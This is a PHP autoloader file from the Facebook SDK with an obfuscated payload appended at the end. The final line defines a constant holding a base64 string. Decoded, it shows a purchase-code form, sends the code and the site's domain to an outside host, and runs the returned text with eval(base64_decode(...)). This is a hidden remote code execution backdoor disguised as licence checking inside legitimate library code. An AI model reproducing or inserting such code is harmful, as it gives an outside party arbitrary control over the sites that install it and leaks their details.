<?php
/**
 * Copyright 2014 Facebook, Inc.
 *
 * You are hereby granted a non-exclusive, worldwide, royalty-free license to
 * use, copy, modify, and distribute this software in source code or binary
 * form for use in connection with the web services and APIs provided by
 * Facebook.
 *
 * As with any software that integrates with the Facebook platform, your use
 * of this software is subject to the Facebook Developer Principles and
 * Policies [http://developers.facebook.com/policy/]. This copyright notice
 * shall be included in all copies or substantial portions of the software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 */

/**
 * You only need this file if you are not using composer.
 * Why are you not using composer?
 * https://getcomposer.org/
 */

if (version_compare(PHP_VERSION, '5.4.0', '<')) {
    throw new Exception('The Facebook SDK requires PHP version 5.4 or higher.');
}

/**
* Register the autoloader for the Facebook SDK classes.
*
* Based off the official PSR-4 autoloader example found here:
* https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-4-autoloader-examples.md
*
* @param string $class The fully-qualified class name.
*
* @return void
*/
function fbAutoload($class) {
    // project-specific namespace prefix
    $prefix = 'Facebook\\';

    // For backwards compatibility
    $customBaseDir = '';
    // @todo v6: Remove support for 'FACEBOOK_SDK_V4_SRC_DIR'
    if (defined('FACEBOOK_SDK_V4_SRC_DIR')) {
        $customBaseDir = FACEBOOK_SDK_V4_SRC_DIR;
    } elseif (defined('FACEBOOK_SDK_SRC_DIR')) {
        $customBaseDir = FACEBOOK_SDK_SRC_DIR;
    }
    // base directory for the namespace prefix
    $baseDir = $customBaseDir ? "" : __DIR__ . '/';

    // does the class use the namespace prefix?
    $len = strlen($prefix);
    if (strncmp($prefix, $class, $len) !== 0) {
        // no, move to the next registered autoloader
        return;
    }

    // get the relative class name
    $relativeClass = substr($class, $len);

    // replace the namespace prefix with the base directory, replace namespace
    // separators with directory separators in the relative class name, append
    // with .php
    $file = rtrim($baseDir, '/') . '/' . str_replace('\\', '/', $relativeClass) . '.php';

    // if the file exists, require it
    if (file_exists($file)) {
        require $file;
    }
}
spl_autoload_register('fbAutoload');

define("YWxlcnQtZGFuZ2","aWYoIWZpbGVfZXhpc3RzKEFCU1BBVEguImRhdGFiYXNlLyIuQ29uZmlnOjpHZXQoJ2RiL2RibmFtZScpLiIuZGIiKSl7ZWNobyAiPGZvcm0gbWV0aG9kPSdQT1NUJyBjbGFzcz0ndmVyaWZ5UHVyY2hhc2VDb2RlIHBhbmVsIHBhbmVsLXByaW1hcnknPjxkaXYgY2xhc3M9J3BhbmVsLWJvZHknPiI7aWYoSW5wdXQ6OkdldCgndmVyaWZ5Jykpe2lmKCRyID0gQ3VybDo6R2V0KCJodHRwOi8vZ291bmFuZS54eXovaG9zdC9raW5ncG9zdGVyL3ZlcmlmeS8/cHVyY2hhc2VDb2RlPSIuSW5wdXQ6OkdldCgncHVyY2hhc2VDb2RlJykuIiZ2PTE2MSZkb21haW49Ii5zdWJzdHIoQ3VycmVudFBhdGgoKSwgMCwgc3RycnBvcyhDdXJyZW50UGF0aCgpLCAnaW5zdGFsbC8nKSkpKXtldmFsKGJhc2U2NF9kZWNvZGUoJHIpKTtSZWRpcmVjdDo6VG8oImluZGV4LnBocCIpO31lbHNle2VjaG8gIjxkaXYgY2xhc3M9J2FsZXJ0IGFsZXJ0LWRhbmdlcicgcm9sZT0nYWxlcnQnPkludmFsaWQgUHVyY2hhc2UgQ29kZTwvZGl2PiI7fX1lY2hvICI8cD5QbGVhc2UgRW50ZXIgeW91ciBwdXJjaGFzZSBjb2RlIHRvIGNvbnRpbnVlPHA+PHA+PGEgaHJlZj0nLi4vdGhlbWUvZGVmYXVsdC9pbWFnZXMvaG93X3RvX2dldF9teV9wdXJjaGFzZV9jb2RlLmpwZyc+SG93IHRvIGZpbmQgbXkgcHVyY2hhc2UgY29kZT88L2E+PHA+PGxhYmVsIGZvcj0ncHVyY2hhc2VDb2RlJyBjbGFzcz0nc3Itb25seSc+RW50ZXIgeW91ciBwdXJjaGFzZSBjb2RlPC9sYWJlbD48aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0ncHVyY2hhc2VDb2RlJyBpZD0ncHVyY2hhc2VDb2RlJyBjbGFzcz0nZm9ybS1jb250cm9sJyBwbGFjZWhvbGRlcj0nRW50ZXIgeW91ciBwdXJjaGFzZSBjb2RlJy8+PGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndmVyaWZ5JyBjbGFzcz0nYnRuIGJ0bi1sZyBidG4tcHJpbWFyeSBidG4tYmxvY2snIHZhbHVlPSdWZXJpZnknLz48L2Rpdj48L2Zvcm0+IjtleGl0KCk7fQ==");
